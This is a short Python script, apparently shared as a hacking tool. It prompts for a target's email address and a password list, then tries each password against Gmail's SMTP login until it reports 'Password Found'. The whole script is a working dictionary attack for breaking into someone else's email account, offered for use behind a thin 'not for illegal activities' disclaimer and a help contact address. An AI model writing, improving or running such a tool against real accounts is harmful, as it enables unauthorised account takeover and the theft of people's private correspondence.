import time
import smtplib
import os

print('[~] Please wait while the program is loading...')
print('[~] Checking files integrity...')
print('[~] This tool is not for illegal activities...')
time.sleep(3)
print('')
print('[!!] For any questions or help please contact: HighS3c@protonmail.ch')
print('')
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("[1] Enter the target's email address: ")
passwfile = raw_input("[2] Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found %s" % password
		break

	except smtplib.SMTPAuthenticationError:
		print('')
		print "[!] Password Incorrect: %s" % password
